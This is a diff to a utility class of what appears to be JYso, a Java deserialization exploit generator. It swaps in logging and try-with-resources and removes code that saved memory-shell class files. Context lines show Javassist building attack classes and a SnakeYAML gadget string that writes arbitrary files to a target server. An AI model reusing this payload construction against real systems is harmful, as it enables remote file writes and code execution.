@@ -5,7 +5,8 @@ import javassist.CannotCompileException;
 import javassist.ClassPool;
 import javassist.CtClass;
 import org.apache.commons.codec.binary.Base64;
-import org.apache.commons.lang.StringUtils;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
 
 import java.io.*;
 import java.lang.reflect.Field;
@@ -14,8 +15,6 @@ import java.lang.reflect.Proxy;
 import java.util.Random;
 import java.util.zip.Deflater;
 import java.util.zip.GZIPOutputStream;
-
-import com.sun.rowset.JdbcRowSetImpl;
 
 import java.io.InputStream;
 import java.lang.reflect.*;
@@ -27,7 +26,10 @@ import static com.qi4l.JYso.gadgets.utils.handle.ClassMethodHandler.insertMethod
 import static com.qi4l.JYso.gadgets.utils.handle.ClassNameHandler.generateClassName;
 import static com.qi4l.JYso.gadgets.utils.handle.GlassHandler.shrinkBytes;
 
+@SuppressWarnings({"unused"})
 public class Utils {
+    private static final Logger log = LoggerFactory.getLogger(Utils.class);
+
     public static Map<String, Object> createMap(final String key, final Object val) {
         final Map<String, Object> map = new HashMap<>();
         map.put(key, val);
@@ -86,7 +88,7 @@ public class Utils {
         return new String[]{par1, par2};
     }
 
-    public static String base64Decode(String bs) throws Exception {
+    public static String base64Decode(String bs) {
         Class<?> base64;
         byte[] value = null;
         try {
@@ -112,15 +114,6 @@ public class Utils {
         // 总体在进行类字节码的缩短
         shrinkBytes(ctClass);
         byte[] classBytes = ctClass.toBytecode();
-
-        // 保存内存马文件
-        if (GEN_MEM_SHELL) {
-            if (StringUtils.isNotEmpty(GEN_MEM_SHELL_FILENAME)) {
-                writeClassToFile(GEN_MEM_SHELL_FILENAME, classBytes);
-            } else {
-                writeClassToFile(ctClass.getName(), classBytes);
-            }
-        }
     }
 
     public static void loadClassTest(byte[] classBytes, String className) throws Exception {
@@ -323,7 +316,7 @@ public class Utils {
             in.read(FileContent);
             in.close();
         } catch (FileNotFoundException e) {
-            e.printStackTrace();
+            log.error("e: ", e);
         }
         byte[] compressBytes = compress(FileContent);
         return "!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [\"" + destPath + "\"],false],!!java.util.zip.Inflater  { input: !!binary " + Utils.base64Encode(compressBytes) + " },1048576]]";
@@ -337,23 +330,20 @@ public class Utils {
         compresser.reset();
         compresser.setInput(data);
         compresser.finish();
-        ByteArrayOutputStream bos = new ByteArrayOutputStream(data.length);
-        try {
-            byte[] buf = new byte[1024];
-            while (!compresser.finished()) {
-                int i = compresser.deflate(buf);
-                bos.write(buf, 0, i);
-            }
-            output = bos.toByteArray();
-        } catch (Exception e) {
-            output = data;
-            e.printStackTrace();
-        } finally {
+        try (ByteArrayOutputStream bos = new ByteArrayOutputStream(data.length)) {
             try {
-                bos.close();
-            } catch (IOException e) {
-                e.printStackTrace();
+                byte[] buf = new byte[1024];
+                while (!compresser.finished()) {
+                    int i = compresser.deflate(buf);
+                    bos.write(buf, 0, i);
+                }
+                output = bos.toByteArray();
+            } catch (Exception e) {
+                output = data;
+                log.error("e: ", e);
             }
+        } catch (IOException e) {
+            log.error("e: ", e);
         }
         compresser.end();
         return output;
